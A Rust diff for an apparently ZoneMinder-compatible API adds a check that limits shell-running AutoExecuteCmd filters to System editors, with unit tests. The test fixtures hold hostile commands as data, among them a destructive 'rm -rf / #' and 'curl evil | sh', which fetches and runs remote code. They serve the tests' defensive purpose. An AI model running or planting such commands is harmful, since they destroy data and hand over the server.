@@ -51,6 +51,28 @@ fn can_manage_all(claims: &UserClaims) -> bool {
     matches!(claims.perms.level(Feature::System), Level::Edit)
 }
 
+/// `AutoExecuteCmd` is run by `zmfilter.pl` through a shell, so setting it, or
+/// changing a filter that runs one, is shell access on the server. ZoneMinder
+/// keeps both to System editors (`Filter::canEdit`).
+fn refuse_command_change(
+    claims: &UserClaims,
+    auto_execute: Option<u8>,
+    auto_execute_cmd: Option<&str>,
+    existing_auto_execute: u8,
+) -> AppResult<()> {
+    if can_manage_all(claims) {
+        return Ok(());
+    }
+    let sets_command = auto_execute.is_some_and(|v| v != 0)
+        || auto_execute_cmd.is_some_and(|c| !c.trim().is_empty());
+    if sets_command || existing_auto_execute != 0 {
+        return Err(crate::error::AppError::PermissionDeniedError(
+            "filters that execute a command need System Edit".to_string(),
+        ));
+    }
+    Ok(())
+}
+
 fn owns(claims: &UserClaims, owner: Option<u32>) -> bool {
     owner == Some(claims.uid)
 }
@@ -168,6 +190,12 @@ pub async fn update(
     if !can_manage_all(claims) && !owns(claims, existing.user_id) {
         return Err(not_found(id));
     }
+    refuse_command_change(
+        claims,
+        req.auto_execute,
+        req.auto_execute_cmd.as_deref(),
+        existing.auto_execute,
+    )?;
 
     // A structured AST, when supplied, is translated to ZoneMinder's flat
     // query_json (and validated by construction during translation).
@@ -198,6 +226,7 @@ pub async fn create(
 ) -> AppResult<FilterResponse> {
     // A structured AST, when supplied, is translated to ZoneMinder's flat
     // query_json and wins over any raw string.
+    refuse_command_change(claims, req.auto_execute, req.auto_execute_cmd.as_deref(), 0)?;
     let mut req = req;
     if let Some(ast) = &req.filter {
         req.query_json = crate::service::filter_translate::to_zm_query_json(ast)?;
@@ -307,6 +336,88 @@ mod tests {
             concurrent: 0,
             lock_rows: 0,
         }
+    }
+
+    /// An Events editor who is not a System editor.
+    fn events_editor(uid: u32) -> UserClaims {
+        UserClaims::new(
+            Duration::from_secs(600),
+            "editor".into(),
+            uid,
+            UserPermissions {
+                events: crate::util::authz::Level::Edit,
+                system: crate::util::authz::Level::View,
+                ..Default::default()
+            },
+            crate::util::claim::TokenType::Access,
+        )
+    }
+
+    #[tokio::test]
+    async fn only_system_editors_may_create_a_command_filter() {
+        let state =
+            AppState::for_test_with_db(MockDatabase::new(DatabaseBackend::MySql).into_connection());
+        for req in [
+            crate::dto::request::CreateFilterRequest {
+                name: "x".into(),
+                query_json: "{}".into(),
+                auto_execute: Some(1),
+                auto_execute_cmd: Some("rm -rf / #".into()),
+                ..Default::default()
+            },
+            // A command stored with AutoExecute off is one toggle from running.
+            crate::dto::request::CreateFilterRequest {
+                name: "x".into(),
+                query_json: "{}".into(),
+                auto_execute_cmd: Some("id".into()),
+                ..Default::default()
+            },
+        ] {
+            let err = create(&state, req, &events_editor(4))
+                .await
+                .expect_err("must be refused");
+            assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
+        }
+    }
+
+    #[tokio::test]
+    async fn owner_cannot_turn_on_auto_execute() {
+        let db = MockDatabase::new(DatabaseBackend::MySql)
+            .append_query_results::<FilterModel, _, _>(vec![vec![mk_filter_owned(5, Some(4))]])
+            .into_connection();
+        let state = AppState::for_test_with_db(db);
+        let req = crate::dto::request::UpdateFilterRequest {
+            auto_execute: Some(1),
+            auto_execute_cmd: Some("curl evil | sh".into()),
+            ..Default::default()
+        };
+        let err = update(&state, 5, &req, &events_editor(4))
+            .await
+            .expect_err("must be refused");
+        assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
+    }
+
+    #[tokio::test]
+    async fn owner_cannot_edit_a_filter_that_runs_a_command() {
+        // An admin enabled AutoExecute on the user's filter; the user may not
+        // then retarget it with a new query.
+        let existing = FilterModel {
+            auto_execute: 1,
+            auto_execute_cmd: Some("/usr/local/bin/notify".into()),
+            ..mk_filter_owned(5, Some(4))
+        };
+        let db = MockDatabase::new(DatabaseBackend::MySql)
+            .append_query_results::<FilterModel, _, _>(vec![vec![existing]])
+            .into_connection();
+        let state = AppState::for_test_with_db(db);
+        let req = crate::dto::request::UpdateFilterRequest {
+            name: Some("renamed".into()),
+            ..Default::default()
+        };
+        let err = update(&state, 5, &req, &events_editor(4))
+            .await
+            .expect_err("must be refused");
+        assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
     }
 
     #[tokio::test]
